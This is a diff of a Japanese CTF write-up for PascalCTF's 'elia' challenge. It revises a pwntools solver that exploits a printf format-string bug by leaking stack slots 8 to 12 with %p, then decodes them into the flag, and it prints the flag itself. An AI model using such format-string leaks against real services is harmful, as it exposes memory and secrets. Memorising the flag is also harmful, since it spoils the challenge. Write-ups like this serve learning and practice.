@@ -215,26 +215,29 @@ undefined8 main(void)
 FSBが存在しており、かつフラグは読まれてスタックに格納されていることが分かります。`%s`で読み出そうとするとなんかうまく行かないので`%p`で0から20番目までの引数を読み出してみたところ、8から12番目に印字可能な数値が続いていました。これを考慮して適当にsolverを書きます。
 ```python
 from pwn import *
-
 file = './elia'
 elf = context.binary = ELF(file)
-context.log_level = 'error'
 
-hex = []
+p = remote('elia.challs.pascalctf.it', 1339)
+p.recvline()
 
+payload = ''
 for i in range(8, 13):
-    p = remote('elia.challs.pascalctf.it', 1339)
-    p.recvline()
-    print(f'i = {i}')
-    payload = f'%{i}$p'
-    p.sendline(payload)
-    hex.append(p.recvall().decode().strip())
+    payload += f'%{i}$p'
 
-print(' '.join(hex))
+p.sendline(payload)
+
+flag = [int(i, 16) for i in p.recvline().decode().split('0x')[1:]]
+pascal = ''
+for i in flag:
+    pascal += i.to_bytes(8, 'little').decode()
+
+pascal = pascal.replace('\x00', '')
+print(pascal)
+
 ```
-これだけだと`0x54436c6163736170 0x3172705f306e7b46 0x6e6c75762d66746e 0x6e75665f306e2d73 0x0000007d6c6c3440`みたいな感じになるので、お手製のプログラムに食わせて印字させてみました。
 
-フラグは`pascalCTF{n0_pr1ntf-vulns-n0_fun@4ll}`となります。
+フラグ: `pascalCTF{n0_pr1ntf-vulns-n0_fun@4ll}`
 
 # 最後に
 CTFは日本時間だと深夜開催(0-5時)。その日は予定があることを忘れており、結局寝ました。
